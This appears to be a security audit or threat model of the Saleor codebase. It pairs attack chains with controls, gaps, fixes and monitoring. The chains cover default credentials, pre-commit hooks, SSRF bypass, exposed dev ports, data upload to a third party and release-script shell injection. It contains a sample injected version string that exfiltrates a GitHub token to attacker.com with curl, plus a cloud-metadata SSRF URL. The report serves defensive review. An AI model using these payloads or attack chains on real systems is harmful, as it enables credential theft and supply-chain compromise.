failures.failure_mode: populatedb creates superuser admin@example.com/admin with documented credentials — internet-exposed dev/staging instances are trivially compromised
attack_chain: Developer or operator runs `python manage.py populatedb --createsuperuser` (or `uv run poe populatedb`) on a dev/staging instance
The command creates a superuser with email admin@example.com and password 'admin' — credentials are publicly documented in CONTRIBUTING.md and pyproject.toml help text
The dev/staging instance is deployed with network access (e.g., staging URL, misconfigured firewall, or dev environment exposed to internet)
Attacker consults the public Saleor documentation, finds the documented credentials admin@example.com/admin
Attacker authenticates via tokenCreate mutation with these credentials, receives a valid JWT with superuser privileges
Attacker has full admin access: can read all data, modify any configuration, install malicious apps, exfiltrate customer data, and pivot to production via shared infrastructure
failures.business_impact: Complete takeover of any exposed dev/staging instance. If staging shares infrastructure, databases, or secrets with production (common in small teams), this becomes a production breach. Customer PII, payment test data, and internal business data are exposed. Reputational damage from public disclosure.
failures.blast_radius: The exposed instance fully, plus any connected systems reachable from it (shared Postgres, Redis, S3 buckets, payment gateway test accounts, CI/CD pipelines if secrets are shared). Lateral movement to production is likely if staging and production share credentials or network segments.
failures.trigger: Running populatedb on any instance that is network-reachable beyond localhost. The credentials are hardcoded in the command and publicly documented — no attacker effort is required to discover them.
failures.evidence: pyproject.toml: populatedb.help = 'Populates database with sample data and creates admin user with credentials: - email: admin@example.com - password: admin'. CONTRIBUTING.md: 'populatedb populates database with example data and creates an admin account for admin@example.com with the password set to admin.' saleor/core/management/commands/populatedb.py creates the superuser with these fixed credentials.

failures.failure_mode: Pre-commit local hooks execute manage.py (full app import) on developer machines during git commit — malicious PR code runs with reviewer's credentials
attack_chain: Attacker submits a PR to the Saleor repository with a seemingly benign change (e.g., a bug fix in a model file)
The PR modifies a file matching `models\.py$` or triggers the gql-schema-check hook (any file change)
Reviewer checks out the PR branch locally and runs `git commit` on any change
The pre-commit hook `migrations-check` fires: `sh -c './manage.py makemigrations --check --dry-run'` — this imports the entire Django app including the attacker's modified models.py
Alternatively, `gql-schema-check` fires: `sh -c './manage.py get_graphql_schema | diff saleor/graphql/schema.graphql -'` — again full app import
The attacker's code in models.py (or any imported module) executes arbitrary Python during the import — e.g., a module-level `os.system()` call, network exfiltration, or credential theft
The malicious code runs with the reviewer's full local credentials: SSH keys, cloud credentials, GitHub tokens, database access, and any secrets in the developer's environment
failures.business_impact: Supply-chain attack on Saleor maintainers and contributors. Theft of GitHub tokens (repo write access, ability to push to main), cloud credentials (AWS/GCP/Azure), SSH keys, and local secrets. A compromised maintainer account can push malicious code to production releases, affecting all Saleor Cloud customers and self-hosted deployments.
failures.blast_radius: The reviewer's entire machine and all credentials accessible from it. Propagates to the Saleor GitHub repository (via stolen tokens), to cloud infrastructure (via stolen cloud credentials), and to all downstream users who install the compromised release.
failures.trigger: Any contributor or maintainer runs `git commit` on a branch containing attacker-controlled code that modifies files matching the pre-commit hook patterns (`models\.py$` for migrations-check, or any file for gql-schema-check). The hooks use `language: system` and execute `./manage.py` directly, importing the full application.
failures.evidence: .pre-commit-config.yaml: two local hooks with `language: system` — `entry: sh -c "./manage.py makemigrations --check --dry-run"` (files: "models\\.py$") and `entry: sh -c "./manage.py get_graphql_schema | diff saleor/graphql/schema.graphql -"`. manage.py imports saleor.settings which imports the full Django app registry. No sandboxing, containerization, or code isolation is applied.

failures.failure_mode: Semgrep no-requests-lib rule only blocks requests.* — urllib.request/http.client bypass the SSRF wrapper entirely, giving a false sense of SSRF coverage
attack_chain: Security team relies on .semgrep/security/requests/no-use-requests-lib.yaml to enforce that all outbound HTTP goes through HTTPClient.send_request (the SSRF protection wrapper with IP allowlisting, scheme restrictions, and redirect limits)
The semgrep rule patterns only match requests.get/post/put/delete/head/patch/request and requests.Session() methods — urllib.request, http.client, httpx, aiohttp, and raw socket calls are not covered
A malicious Saleor App (installed via the App system, which runs Python code in-process) or a vulnerability in request-handling code uses urllib.request.urlopen() for outbound HTTP
The code passes semgrep cleanly — no finding is raised because the rule doesn't match urllib.request
The app calls urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/') to reach the cloud metadata endpoint
The SSRF protections in HTTPClient.send_request (IP allowlisting, scheme restrictions, redirect limits) are never invoked because the code path uses urllib directly
Attacker reads cloud IAM credentials from the metadata service, uses them to access S3 buckets (product images, backups), read secrets from AWS Secrets Manager, or pivot to other internal services
failures.business_impact: Full SSRF leading to cloud credential theft. An installed app (or compromised dependency) can reach internal services, the cloud metadata endpoint, and internal network resources. Stolen IAM credentials grant access to S3 buckets containing customer data, database backups, and secrets. This is a complete infrastructure compromise vector.
failures.blast_radius: From the Saleor pod to the entire cloud account: metadata service (IAM credentials), internal services (databases, caches, other microservices), S3/GCS/Azure storage buckets, secrets managers. The blast radius extends to all data and services accessible by the pod's IAM role.
failures.trigger: Any code path (app, plugin, or core code) that uses urllib.request, http.client, httpx, aiohttp, or raw sockets for outbound HTTP. The project's own code demonstrates the bypass: .claude/skills/filter-benchmark/analyze_query.py uses urllib.request.urlopen() and passes semgrep cleanly.
failures.evidence: .semgrep/security/requests/no-use-requests-lib.yaml: pattern-either only matches `requests.request/get/post/put/delete/head/patch(...)` and `$SESSION = requests.Session(...)` followed by session methods. No patterns for urllib.request, http.client, httpx, aiohttp, or socket. The project's own .claude/skills/filter-benchmark/analyze_query.py line: `resp = urllib.request.urlopen(req, timeout=10)` — uses urllib.request and passes the semgrep rule. The rule message claims 'In order to not introduce SSRF vulnerabilities, the requests library shouldn't be used directly' — giving a false sense of SSRF coverage.

failures.failure_mode: Devcontainer exposes Postgres superuser and Valkey on host ports with hardcoded credentials — any local process gets full DB access
attack_chain: Developer starts the devcontainer stack via `docker compose up` (or .worktree-container/compose.sh up -d)
docker-compose.yml maps Postgres port 5432 to host port 5432 with POSTGRES_USER=saleor, POSTGRES_PASSWORD=saleor (superuser credentials)
Valkey/Redis port 6379 is also mapped to the host with no authentication configured
Any process running on the developer's host machine (malware, a malicious npm package, a compromised dev tool, or another container) can connect to localhost:5432
The attacker authenticates to Postgres as the saleor superuser with the known password 'saleor'

With superuser access, the attacker can read all data, modify any table, create/drop databases, read secrets stored in the DB, and potentially escalate to the host via Postgres extensions (e.g., COPY FROM PROGRAM if the attacker can create functions)

The attacker can also connect to Valkey on localhost:6379 with no auth, read/write cache entries, poison cached data (site settings, dataloaders), and potentially achieve RCE via cache poisoning if any code deserializes cached data unsafely
failures.business_impact: Any local process on a developer machine with the devcontainer running gets full database superuser access. This enables theft of all local dev data, injection of malicious data that could propagate to staging/production via shared tooling, and potential host compromise via Postgres privilege escalation. For teams where developers also have production credentials on the same machine, this is a direct path to production compromise.
failures.blast_radius: The developer's entire machine (via local port exposure), all data in the dev database, the Valkey cache (which may contain cached production-like data or session tokens), and potentially the host OS via Postgres superuser escalation. If the developer's machine has VPN access to production networks, this extends further.
failures.trigger: Devcontainer or worktree-container stack is running (docker compose up). Any process on the host can connect to localhost:5432 (Postgres superuser saleor/saleor) or localhost:6379 (Valkey, no auth). No additional condition is needed — the ports are exposed by default.
failures.evidence: .devcontainer/docker-compose.yml: db service has `ports: - 5432:5432` and `environment: - POSTGRES_USER=saleor - POSTGRES_PASSWORD=saleor`. cache service has `ports: - 6379:6379` with no password/auth configured. .devcontainer/devcontainer.json forwardPorts includes "db:5432" and "cache:6379". .devcontainer/backend.env: DATABASE_URL=postgres://saleor:saleor@db/saleor and CACHE_URL=redis://cache:6379/0. .worktree-container/docker-compose.yml uses ephemeral ports but still exposes them on the host with the same hardcoded credentials.

failures.failure_mode: filter-benchmark skill uploads full SQL query plans (with embedded data literals) to public third-party service explain.dalibo.com
attack_chain: Developer or AI agent uses the filter-benchmark skill to analyze query performance on a production-like or staging database
The skill's analyze() function calls qs.query.sql_with_params() which returns the full SQL with all parameter values inlined as literals
For queries filtering on user data (e.g., email addresses, names, order IDs, gift card codes, phone numbers), the SQL contains these literal values
_run_explain() executes EXPLAIN (ANALYZE, COSTS, VERBOSE, BUFFERS, FORMAT JSON) and captures the full plan including the SQL text with embedded literals

_upload_to_dalibo() sends the complete plan JSON to https://explain.dalibo.com/new — a public third-party service with no authentication, no data retention guarantee, and no contractual data protection

The uploaded plan (containing real customer PII, order values, gift card codes, or other business data embedded in query literals) is now stored on Dalibo's servers, accessible via the returned URL, and potentially indexed, logged, or retained indefinitely
Anyone with the URL (which may be shared in chat, tickets, or logs) can view the plan. Dalibo or a third party with access to their systems can read the embedded data literals
failures.business_impact: Involuntary disclosure of production or staging data (customer PII, order details, gift card codes, pricing data) to a public third-party service. This is a GDPR/privacy compliance violation (unauthorized transfer of personal data to a third party without a data processing agreement). Gift card codes or checkout tokens embedded in query literals could enable financial fraud. Reputational damage and potential regulatory penalties.
failures.blast_radius: All data values embedded in the analyzed SQL queries — potentially customer emails, names, addresses, order amounts, gift card codes, discount codes, and internal IDs. The data is permanently uploaded to a public service; deletion is not guaranteed. The URLs may propagate through chat logs, CI artifacts, or shared documents.
failures.trigger: Running the filter-benchmark skill's analyze() function (with default upload=True) against a queryset whose SQL contains sensitive literal values. This happens whenever a developer benchmarks a filter on real or realistic data containing PII or business-sensitive values.
failures.evidence: .claude/skills/filter-benchmark/analyze_query.py: `sql, params = qs.query.sql_with_params()` captures full SQL with inlined parameters. `_upload_to_dalibo()` sends `json.dumps({"plan": json.dumps(plan), "title": title, "query": ""})` to `https://explain.dalibo.com/new` via `urllib.request.urlopen(req, timeout=10)`. The analyze() function has `upload: bool = True` as default. SKILL.md Step 5 instructs users to run this against their database. No data redaction, no opt-out warning, no authentication on the upload endpoint.

failures.failure_mode: release-it hooks interpolate pyproject.toml version into shell commands — command injection during release gives attacker the maintainer's GitHub token and push access
attack_chain: Maintainer runs `npm run release` (release-it) to cut a new Saleor release
release-it reads the version from pyproject.toml (e.g., "3.24.0-a.0") and interpolates it into hook commands as ${version}
The after:bump hook runs: `git checkout -B release-${version} --track` — the version string is interpolated directly into a shell command without quoting or sanitization

The after:release hook runs: `git push origin release-${version}` and `gh pr create --base \`cat .base_ver_release.txt\` --head release-${version} --title \"Release ${version}\" ...` — again with unquoted shell interpolation

An attacker who can modify pyproject.toml (via a malicious PR that a maintainer merges, or via a compromised dependency that writes to pyproject.toml during a build step) sets version to a string containing shell metacharacters: e.g., `3.24.0-a.0\"; curl attacker.com/steal?token=$GITHUB_TOKEN; #`

When the maintainer runs the release, the injected shell command executes in the maintainer's environment with their GitHub token (GH_TOKEN/GITHUB_TOKEN env var), SSH keys, and push access to the saleor/saleor repository
The attacker exfiltrates the GitHub token, uses it to push malicious code to the repository, create releases with malware, or access other repositories the token can reach
failures.business_impact: Compromise of the Saleor GitHub repository via stolen maintainer credentials. The attacker can push malicious code to production releases, which are then distributed to all Saleor Cloud customers and self-hosted deployments via Docker images and PyPI. This is a critical supply-chain attack affecting the entire Saleor ecosystem.
failures.blast_radius: The maintainer's GitHub account and all repositories accessible by their token. Propagates to the official saleor/saleor repository, PyPI package (saleor), Docker Hub images (saleor/saleor), and all downstream users who pull the compromised release. This is a full supply-chain compromise of a widely-used open-source e-commerce platform.
failures.trigger: A maintainer runs `npm run release` (release-it) after pyproject.toml's version field has been modified to contain shell metacharacters. The modification can come from a malicious PR, a compromised pre-commit hook, or any code execution during the development workflow that writes to pyproject.toml.
failures.evidence: .release-it.json hooks section: `"after:bump": ["uv lock --refresh-package saleor", "git checkout -B release-${version} --track"]` and `"after:release": ["git push origin release-${version}", "npx release-it --changelog > .release_changelog.txt", "gh pr create --base \`cat .base_ver_release.txt\` --head release-${version} --title \"Release ${version}\" --body-file '.release_changelog.txt' --label release --assignee @me -R saleor/saleor", "rm .release_changelog.txt .base_ver_release.txt"]`. The ${version} variable is interpolated into shell commands without quoting or escaping. The @release-it/bumper plugin reads version from pyproject.toml path "project.version".

No CI check or deployment guard that scans for default/weak SECRET_KEY values before a release or deploy.
.env.example is referenced in docs but its contents are not shown in the provided codebase, so it's unverified whether it also ships a placeholder key.
The devcontainer value is a literal 'changeme' with no comment warning that it must never be used outside local development.

controls.failure_mode: populatedb creates superuser admin@example.com/admin with documented credentials — internet-exposed dev/staging instances are trivially compromised

controls.failure_mode: Pre-commit local hooks execute manage.py (full app import) on developer machines during git commit — malicious PR code runs with reviewer's credentials

controls.file_pattern_scoping: The migrations-check hook only triggers on files matching 'models\\.py$', and gql-schema-check runs on any commit but executes a read-only schema generation command.
controls.pinned_hook_versions: All remote pre-commit hooks (ruff, mypy, semgrep, deptry, uv-lock) are pinned to specific frozen commit hashes, reducing the risk of a compromised upstream hook version.

No use of pre-commit's isolated language environments (language: python with additional_dependencies) for the local hooks — they run in the system Python environment with full access.
No code review gate or branch protection that would prevent a malicious models.py change from reaching a reviewer's checkout before commit.
The migrations-check hook runs 'makemigrations --check --dry-run' which imports all models and app configs, executing any module-level code in the attacker's modified files.
No documentation in CONTRIBUTING.md or AGENTS.md warning contributors that running git commit on untrusted branches executes arbitrary code via these hooks.

controls.requests_library_blocked: The no-requests-lib semgrep rule (severity ERROR) blocks direct use of requests.get/post/put/delete/head/patch and requests.Session methods, directing developers to HTTPClient.send_request.
controls.fix_regex_provided: The rule includes a fix-regex that automatically rewrites requests.* calls to HTTPClient.send_request(...), making the intended pattern easy to apply.
controls.pytest_socket_guard: pyproject.toml configures pytest with --disable-socket and --allow-hosts limited to localhost/cache hosts, preventing tests from making unexpected outbound network calls.
controls.documented_wrapper: The rule message explicitly states the SSRF rationale and names HTTPClient.send_request as the required replacement.

gaps: The rule only matches the 'requests' library — urllib.request, http.client, httpx, aiohttp, and raw socket usage are not covered by any semgrep rule.
The project's own code demonstrates the bypass: .claude/skills/filter-benchmark/analyze_query.py uses urllib.request.urlopen() to POST data to explain.dalibo.com and passes semgrep cleanly.
No semgrep rule blocks urllib.request.urlopen, http.client.HTTPConnection, httpx, or aiohttp usage in application code.
No runtime SSRF protection (e.g., egress firewall, DNS resolution allowlist, or metadata-service blocking) documented in the codebase as a defense-in-depth layer.
The HTTPClient.send_request wrapper itself is not shown in the provided codebase, so it's unverified whether it enforces timeouts, redirect limits, or destination allowlists.

controls.failure_mode: Devcontainer exposes Postgres superuser and Valkey on host ports with hardcoded credentials — any local process gets full DB access

controls.worktree_isolation: The .worktree-container/docker-compose.yml variant publishes only container ports (e.g., '5432', '6379') without host port mappings, so Docker assigns ephemeral host ports and avoids conflicts between worktrees.
controls.documented_intent: The .worktree-container/README.md explicitly describes the design goal of isolating multiple worktree stacks from each other.

Valkey is exposed on host port 6379 with no authentication configured (no requirepass), so any local process can read/write the cache.
The devcontainer.json forwardPorts list includes 5432 and 6379, meaning VS Code/Codespaces will also forward these ports, potentially exposing them beyond the local machine in some configurations.
No documentation warning in CONTRIBUTING.md or the devcontainer README that these ports are exposed on all interfaces and should not be used on shared or untrusted networks.

controls.failure_mode: filter-benchmark skill uploads full SQL query plans (with embedded data literals) to public third-party service explain.dalibo.com

The uploaded payload includes the plan JSON which, for EXPLAIN ANALYZE with VERBOSE, contains actual row values and filter constants from the analyzed query — potentially including PII from realistic test data.
The skill documentation (SKILL.md Step 5) instructs users to call analyze() with default settings and presents the Dalibo links as part of the standard report, encouraging the upload by default.
No warning in the skill documentation or in the analyze() function output that the upload sends data to a public third-party service and may include sensitive values.
No option to sanitize or redact the plan before upload (e.g., stripping literal values, anonymizing table names).
The uploaded data goes to a public service with no authentication, no data processing agreement referenced, and no documented retention/deletion policy.

gaps: The after:bump hook runs 'uv lock --refresh-package saleor' and 'git checkout -B release-${version} --track' where ${version} is interpolated directly into a shell command with no sanitization or validation of the version string.
The after:release hook interpolates ${version} into 'git push origin release-${version}', 'gh pr create --title "Release ${version}"', and other shell commands with no quoting or escaping.

The version originates from pyproject.toml's project.version field, which is a file that can be modified by any PR — there is no validation that the version string matches a safe pattern (e.g., semver) before it's used in shell commands.
No pre-release validation step that checks the version string format or scans pyproject.toml for unexpected modifications before the hooks execute.
The hooks run with the maintainer's full GitHub token (gh CLI authenticated) and git push credentials, so command injection yields full repository and release pipeline access.

The before:bump hook writes the base branch name to .base_ver_release.txt and the after:release hook reads it with backtick command substitution ('cat .base_ver_release.txt'), another shell interpolation point if that file could be tampered with.

remediations.failure_mode: Default SECRET_KEY 'changeme' enables JWT forgery and full auth bypass in any deployment that doesn't rotate it
fixes: Add startup validation in saleor/settings.py that refuses to boot (or logs CRITICAL and exits non-zero in production mode) when SECRET_KEY equals 'changeme' or matches a known-default allowlist (e.g., 'changeme', 'django-insecure-...', empty string, values < 32 chars).

Generate a cryptographically random SECRET_KEY (secrets.token_urlsafe(64)) automatically on first boot when running in local/dev mode only; require explicit SECRET_KEY env var in production with fail-fast behavior.

Replace the literal 'changeme' in .devcontainer/backend.env with a clearly-labeled dev-only placeholder (e.g., SECRET_KEY=dev-only-insecure-do-not-use-in-prod-<random suffix>) plus an inline comment warning it must never ship to production.

Audit and scrub .env.example, docs, README, and deployment templates (Docker, Helm, Terraform, Heroku/Render/Fly guides) for any shipped SECRET_KEY values; replace with 'generate-your-own' instructions.
Add a CI guard (GitHub Actions job) that fails the build if any tracked file contains SECRET_KEY=changeme or other known default patterns (regex scan over repo + docs).
Add pre-commit hooks (gitleaks + detect-secrets with Saleor-specific allowlist for dev placeholders) to .pre-commit-config.yaml to block committing default keys.

Implement a key-rotation runbook and tooling: support SECRET_KEY (current) + SECRET_KEY_PREVIOUS (grace window) so operators can rotate without invalidating all sessions; document rotation steps in the security runbook.
Add a management command (e.g., python manage.py audit_secrets) that checks SECRET_KEY strength, flags known defaults, and reports whether rotation is overdue, wired into deployment health checks.
monitoring: Emit a structured CRITICAL log and metrics counter (e.g., saleor.secret_key.default_detected) at startup when SECRET_KEY matches a known default; alert on any occurrence in non-dev environments.
Add a periodic scheduled check (management command or Celery beat task) that re-validates SECRET_KEY entropy/length and alerts if it degrades or matches defaults.
Instrument JWT verification failures with reason codes (bad_signature, expired, unknown_key_id) and alert on spikes in bad_signature failures, which may indicate forgery attempts against a weak key.
Create a dashboard panel tracking: startup secret validation status per environment, JWT signature failure rate, and time-since-last-key-rotation; page on-call if default key detected in prod.
Log (without values) a startup event with SECRET_KEY fingerprint (e.g., first 4 chars of SHA-256) so operators can verify across nodes that all instances share the rotated key.
Add canary detection: a scheduled internal request using a deliberately-invalid token to confirm the auth layer rejects forged signatures, alerting if it ever succeeds.
resilience_upgrades: Introduce key versioning (kid header in JWTs) so multiple valid keys can coexist during rotation, enabling zero-downtime SECRET_KEY rotation across fleets.

Move JWT signing to asymmetric keys (RS256/ES256) with a private key held in a secrets manager (Vault/AWS SM) and public keys distributed for verification, removing the shared-secret single point of failure.
Shorten JWT lifetimes and enforce refresh-token rotation so a forged or leaked token has bounded blast radius.
Add per-request anomaly detection on authenticated GraphQL operations (e.g., staff actions from unusual IPs/geo) to contain damage even if a token is forged.
Isolate app tokens from user tokens with separate signing keys and scopes so a single key compromise cannot forge both user and app identities.
Add rate limiting and lockout on the GraphQL auth endpoint to slow brute-force/forgery attempts against weak keys during the migration window.
Document and rehearse an incident-response playbook for 'suspected SECRET_KEY compromise': revoke/rotate key, invalidate sessions, audit staff actions, notify merchants.

fixes: Replace both `language: system` local hooks with `language: python` hooks that run in pre-commit's isolated virtualenv with pinned `additional_dependencies` (Django, Saleor deps), eliminating access to system Python and host credentials.

Remove `sh -c './manage.py ...'` entries entirely; rewrite hooks as standalone Python scripts (e.g., `scripts/check_migrations.py`, `scripts/check_gql_schema.py`) invoked via `language: python` with `pass_filenames: false`.

Run manage.py-equivalent checks inside a container (`language: docker` or `docker_image: python:3.x`) with `--network none`, read-only bind mounts, and no credential env passthrough, so untrusted code cannot reach SSH keys, cloud tokens, or env secrets.
Add `--skip-checks` escape hatch and a `SALORE_PRECOMMIT_SAFE=1` env flag documented for reviewers, plus a pre-commit `ci.skip` config so hooks never run on untrusted CI checkouts without review.
Pin hook repo versions and add `pre-commit autoupdate` to CI with a required review gate so hook definitions cannot be silently changed by a PR.
Add a `verify-hooks` CI job that diffs `.pre-commit-config.yaml` and fails if any hook uses `language: system` or executes `manage.py` directly.

Introduce a two-step reviewer workflow: `git fetch` + `pre-commit run --all-files` only after `git diff main...HEAD` review, enforced via a wrapper script `scripts/safe-commit.sh` documented in CONTRIBUTING.md.
Migrate long-term to `pre-commit.ci` or GitHub Actions for migrations/gql-schema checks so validation runs in ephemeral CI runners, not on developer machines.
monitoring: Alert on any commit or PR that modifies `.pre-commit-config.yaml` (require maintainer approval via CODEOWNERS + branch protection).
Log and audit all `pre-commit run` invocations on maintainer machines via a wrapper that records hook name, repo rev, and timestamp to a central SIEM.

Track hook execution failures and timeouts as a signal of tampering (e.g., a hook that hangs or crashes after a suspicious PR).
Weekly automated scan of the repo asserting no `language: system` hooks exist and that all hook entries are pinned to reviewed revisions.
Detect developer machines where pre-commit hooks were bypassed (`core.hooksPath` overrides, `--no-verify` usage) via git config auditing in MDM.
resilience_upgrades: Adopt a hardened developer environment baseline: dedicated low-privilege dev VMs/containers for PR review, with credentials (GitHub tokens, cloud keys) stored in a secrets manager and injected only into CI, never into review checkouts.

Enable GitHub branch protection requiring CODEOWNERS review plus a passing `verify-hooks` and `pre-commit.ci` check before any PR branch can be merged, reducing the chance malicious code reaches a reviewer unnoticed.
Provide maintainers with a one-command sandboxed review flow (`scripts/review-pr.sh <PR#>`) that checks out the PR into an isolated, network-restricted container and runs all checks there.
Rotate and short-scope all maintainer credentials: replace long-lived GitHub PATs with GitHub Apps / OIDC short-lived tokens; enforce hardware-key 2FA and IP allowlists on the Saleor org.

Add a canary tripwire: a benign module-level canary in `saleor/settings.py` that, if executed outside CI, writes a marker and alerts — enabling rapid detection of arbitrary code execution on dev machines.
Document an incident-response runbook for 'reviewer machine compromised via PR review' including credential revocation, token rotation, and forensic imaging steps.
